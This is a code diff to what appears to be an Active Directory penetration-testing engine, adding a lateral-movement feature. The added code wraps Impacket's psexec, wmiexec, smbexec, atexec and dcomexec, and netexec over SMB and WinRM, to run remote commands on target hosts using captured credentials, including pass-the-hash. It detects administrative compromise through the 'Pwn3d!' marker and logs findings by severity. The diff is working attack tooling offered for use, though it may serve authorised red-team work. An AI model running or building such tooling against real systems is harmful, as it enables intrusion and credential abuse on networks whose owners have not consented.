@@ -51,6 +51,11 @@ TOOL_CANDIDATES = {
     'bloodhound':   ['bloodhound-python', 'bloodhound.py'],
     'netexec':      ['netexec', 'nxc', 'crackmapexec', 'cme'],
     'evil-winrm':   ['evil-winrm'],
+    'psexec':       ['psexec.py', 'impacket-psexec'],
+    'wmiexec':      ['wmiexec.py', 'impacket-wmiexec'],
+    'smbexec':      ['smbexec.py', 'impacket-smbexec'],
+    'atexec':       ['atexec.py', 'impacket-atexec'],
+    'dcomexec':     ['dcomexec.py', 'impacket-dcomexec'],
     'petitpotam':   ['petitpotam.py', 'PetitPotam.py', 'petitpotam'],
     'printerbug':   ['printerbug.py', 'dementor.py'],
     'hashcat':      ['hashcat'],
@@ -180,6 +185,63 @@ def build_responder_argv(exe: str, iface: str, analyze: bool = False) -> list:
     if analyze:
         argv += ['-A']                  # passive analyze — no poisoning
     return argv
+
+
+# Lateral-movement method → logical tool key (drives availability + argv shape).
+LATERAL_METHODS = {
+    'psexec':        'psexec',
+    'wmiexec':       'wmiexec',
+    'smbexec':       'smbexec',
+    'atexec':        'atexec',
+    'dcomexec':      'dcomexec',
+    'netexec-smb':   'netexec',
+    'netexec-winrm': 'netexec',
+}
+
+
+def _netexec_hash(value: str) -> str:
+    """netexec -H wants LM:NT or bare NT — drop the leading ':' of a NT-only value."""
+    h = norm_hashes(value)
+    return h[1:] if h.startswith(':') else h
+
+
+def build_lateral_argv(method: str, exe: str, cred: dict, target: str,
+                       command: str = '') -> list:
+    """Argv for a one-shot remote exec via the chosen lateral method (PtH-aware)."""
+    idn = cred_identity(cred)
+    if method.startswith('netexec'):
+        proto = 'winrm' if method.endswith('winrm') else 'smb'
+        argv = [exe, proto, target, '-u', idn['user']]
+        if idn['is_hash']:
+            argv += ['-H', _netexec_hash(idn['secret'])]
+        else:
+            argv += ['-p', idn['secret']]
+        if idn['domain']:
+            argv += ['-d', idn['domain']]
+        if command:
+            argv += ['-x', command]
+        return argv
+    # impacket exec family: domain/user:pass@target [+ -hashes]  <command>
+    tgt, extra = _auth_impacket_target(cred, target)
+    argv = [exe, tgt] + extra
+    if command:
+        argv += [command]               # positional → run once and exit
+    return argv
+
+
+def parse_lateral(text: str, method: str = 'wmiexec') -> dict:
+    """Best-effort success verdict for a lateral exec."""
+    t = text or ''
+    if method.startswith('netexec'):
+        admin = 'Pwn3d!' in t
+        ok = '[+]' in t
+        return {'success': ok, 'admin': admin,
+                'detail': ('authenticated' + (' — admin (Pwn3d!)' if admin else '')) if ok
+                          else 'authentication failed'}
+    if re.search(r'STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|rpc_s_access_denied|'
+                 r'Authentication failed|Access is denied', t, re.I):
+        return {'success': False, 'detail': 'authentication / access failed'}
+    return {'success': True, 'detail': 'command executed'}
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -389,6 +451,8 @@ class AdEngine:
 
     # ── per-action entry points ──────────────────────────────────────────────
     def start(self, action, spec, on_output, on_complete) -> tuple[bool, str]:
+        if action == 'lateral':
+            return self._start_lateral(spec, on_output, on_complete)
         ok, detail, exe = self.action_available(action)
         if not ok:
             on_output(f'[!] {action}: {detail}. Refusing to run.')
@@ -529,6 +593,42 @@ class AdEngine:
                     'count': len(captured_users)}
         return cid_ok(self._spawn(cid, argv, on_output, on_complete,
                                   parser=parser, long_running=True)), 'started'
+
+    # ── Lateral movement (impacket exec family + netexec, PtH-aware) ─────────
+    def _start_lateral(self, spec, on_output, on_complete):
+        method = spec.get('method', 'wmiexec')
+        logical = LATERAL_METHODS.get(method)
+        if not logical:
+            on_output(f'[!] unknown lateral method: {method}')
+            return False, 'unknown method'
+        exe = self._which(logical)
+        if not exe:
+            cands = ', '.join(TOOL_CANDIDATES.get(logical, []))
+            on_output(f'[!] lateral/{method}: {logical} not on PATH (looked for: {cands}). Refusing.')
+            return False, f'{logical} not available'
+        cred = self.resolve_cred(spec.get('cred_id'))
+        if not cred:
+            on_output('[!] No captured credential selected — capture or add one in Loot first.')
+            return False, 'credential required'
+        return self._do_lateral(spec.get('client_id'), method, exe, cred, spec,
+                                on_output, on_complete)
+
+    def _do_lateral(self, cid, method, exe, cred, spec, on_output, on_complete):
+        target  = spec.get('target') or spec.get('target_ip') or spec.get('dc_ip') or ''
+        command = spec.get('command', '')
+        if not method.startswith('netexec') and not command:
+            on_output('[!] impacket exec is one-shot — provide a command to run.')
+            return False, 'command required'
+        argv = build_lateral_argv(method, exe, cred, target, command)
+
+        def parser(text):
+            v = parse_lateral(text, method)
+            sev = 'CRITICAL' if v.get('admin') else ('HIGH' if v.get('success') else 'INFO')
+            self._add_finding(target, 'lateral:' + method, 'lateral_movement', sev,
+                              f'Lateral exec via {method} on {target}', v['detail'], None)
+            on_output(f'[✓] {method} → {v["detail"]}')
+            return {'results': [v], 'method': method, 'target': target}
+        return cid_ok(self._spawn(cid, argv, on_output, on_complete, parser=parser)), 'started'
 
 
 def cid_ok(v) -> bool:
